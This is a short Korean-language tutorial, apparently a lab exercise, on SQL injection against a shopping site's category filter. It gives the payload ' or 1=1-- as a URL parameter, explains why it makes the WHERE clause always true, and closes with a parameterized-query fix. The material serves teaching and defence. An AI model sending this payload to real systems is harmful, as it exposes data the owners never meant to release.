## 🕵️‍♂️ WHERE — 숨겨진 데이터 검색

**목표:** 카테고리 필터를 우회하여 숨겨진 제품 데이터 확인 및 SQL Injection 이해 <br />

<img width="500" height="300" alt="image" src="https://github.com/user-attachments/assets/20213b7f-ae18-4d3e-8e3e-9a4be850ecd4" />

<br />

### 🧪 실습

1️⃣ 기본 요청 확인:

```text
GET {{shopping_mall_url}}/filter?category=Lifestyle
```

2️⃣ category 파라미터 변경:

```text
filter?category=%27+or+1=1--  // decodeURIComponent: '+or+1=1--'
```

3️⃣ 결과 확인:<br />

→ 필터를 무력화하면 모든 제품이 반환될 수 있다.

<br />

### ⚠️ 취약 원리

입력값 `' or 1=1--` 삽입으로, 모든 조건을 무력화하고 WHERE 조건을 항상 참으로 만든다.

```sql
SELECT *
FROM products
WHERE category = '[사용자입력]' and release = 1;

SELECT *
FROM products
WHERE category = '' or 1=1--' and release = 1;
```

<br />


### 🛡️ 방어책

**ex) 파라미터화 쿼리**:

```js
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [usernameInput, passwordInput]
);
```
